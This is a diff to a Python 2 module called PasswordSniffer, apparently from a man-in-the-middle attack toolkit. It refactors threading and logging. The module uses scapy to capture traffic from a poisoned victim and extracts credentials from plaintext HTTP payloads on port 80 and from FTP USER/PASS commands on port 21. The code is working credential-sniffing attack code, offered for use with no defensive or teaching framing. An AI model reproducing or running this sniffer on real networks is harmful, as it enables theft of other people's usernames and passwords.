@@ -3,12 +3,12 @@ import util
 from sniffer import Sniffer
 from re import findall
 from scapy.all import *
-from threading import Thread
 
 #
 # Module sniffs poisoned traffic for passwords, essentially just parsing payloads for the USERNAME or PASSWORD
 # flag. 
 #
+__name__ = "Password Sniffer"
 class PasswordSniffer(Sniffer):
 	def __init__(self):
 		super(PasswordSniffer, self).__init__('Password')
@@ -23,8 +23,7 @@ class PasswordSniffer(Sniffer):
 
 		self.sniff_filter = "src %s"%self.source
 		self.sniff = True
-		sniff_thread = Thread(target=self.traffic_sniffer)
-		sniff_thread.start()
+		self.sniff_thread.start()
 		return self.source
 	
 	#
@@ -35,10 +34,8 @@ class PasswordSniffer(Sniffer):
 			# http
 			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
 				payload = pkt.getlayer(Raw).load
-				if 'username' in payload or 'password' in payload and self.dump_data:
-					print payload
-				if self.log_data:
-					self.log_file.write(str(payload))
+				if 'username' in payload or 'password' in payload:
+					self.log_msg(str(payload))
 			# ftp
 			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
 				payload = str(pkt.sprintf("%Raw.load%"))
@@ -49,8 +46,6 @@ class PasswordSniffer(Sniffer):
 					prnt = "Host: %s\n[!] User: %s "%(pkt[IP].dst,findall("(?i)USER (.*)", payload)[0])
 				elif 'PASS' in payload:
 					prnt = 'Pass: %s'%findall("(?i)PASS (.*)", payload)[0]
-				if not prnt is None and self.dump_data: 
-					util.Msg(prnt)
-				if self.log_data and not prnt is None: 
-					self.log_file.write(prnt)
+				if not prnt is None:
+					self.log_msg(prnt)
 			# TODO: other protos....
